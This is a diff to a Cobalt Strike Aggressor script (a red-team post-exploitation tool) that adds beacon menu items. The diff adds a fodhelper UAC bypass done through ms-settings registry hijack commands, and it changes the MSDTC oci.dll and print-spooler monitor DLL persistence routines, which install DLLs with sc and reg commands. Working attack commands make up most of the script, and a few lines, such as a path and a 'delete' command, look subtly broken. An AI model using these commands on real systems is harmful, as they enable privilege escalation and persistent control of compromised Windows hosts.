@@ -1,8 +1,8 @@
 popup beacon_bottom {
     menu "UAC Bypass"{
-        item "Upload" {
+        item "fodhelper" {
             $bid = $1;
-            $dialog = dialog("CS上线文件", %(UploadPath => "C:\\Windows\\System32\\calc.exe", bid => $bid), &upload);
+            $dialog = dialog("CS上线文件", %(UploadPath => "C:\\Windows\\System\\calc.exe", bid => $bid), &upload);
             drow_text($dialog, "UploadPath",  "path: ");
             dbutton_action($dialog, "Executing");
             dialog_show($dialog);
@@ -11,7 +11,12 @@ popup beacon_bottom {
             # switch to specify path
             # bcd($bid, $3['UploadPath']);
             # bsleep($bid, 0 ,0);
-            bshell($bid, $3['UploadPath']);
+            bshell($bid, "powershell New-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force");
+            bshell($bid, "powershell New-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value ' ' -Force");
+            bshell($bid, "powershell Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name '\(default\)' -Value $3['UploadPath'] -Force");
+   
+            bshell($bid, "powershell Start-Process 'C:\\Windows\\System32\\fodhelper.exe' -WindowStyle Hidden");
+            bshell($bid, "powershell Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force");
             # if (-is64 $bid['id']) {
             #     bupload($bid, script_resource("/script/x64/frpc.exe"));
             # }else{
@@ -25,7 +30,7 @@ popup beacon_bottom {
         item "Mstdc安装" {
             $bid = $1;
             bcd($bid, "C:\\Windows\\System32");
-            bupload($bid, script_resource("/source/oci.dll"))
+            bupload($bid, script_resource("/source/persistence/oci.dll"))
             bshell($bid, "net stop msdtc");
             bshell($bid, "sc config msdtc obj= LocalSystem");
             bshell($bid, "sc config msdtc start= auto");
@@ -37,14 +42,12 @@ popup beacon_bottom {
             bshell($bid, "del C:\\Windows\\System32\\oci.dll");
         }
         }
-    }
-
-    menu "Spool" {
+        menu "Spool" {
         item "Spool安装" {
             $bid = $1;
             bcd($bid, "C:\\Windows\\System32");
-            bupload($bid, script_resource("/source/print.dll"))
-            bshell($bid, "reg add hklm\\system\\currentcontrolset\\control\\print\\monitors\\monitor /v Driver /d print.dll /t REG_SZ");
+            bupload($bid, script_resource("/source/persistence/spool.dll"))
+            bshell($bid, "reg add hklm\\system\\currentcontrolset\\control\\print\\monitors\\monitor /v Driver /d spool.dll /t REG_SZ");
 
         }
         item "Spool触发" {
@@ -56,8 +59,11 @@ popup beacon_bottom {
             $bid = $1;
             bshell($bid, "sc stop spooler");  
             bshell($bid, "reg delete hklm\\system\\currentcontrolset\\control\\print\\monitors\\monitor\\Driver /f");
-            bshell($bid, "delete C:\\Windows\\System32\\print.dll")
+            bshell($bid, "delete C:\\Windows\\System32\\spool.dll")
         }
-        }
+        
     }
+    }
+    
+    
 }
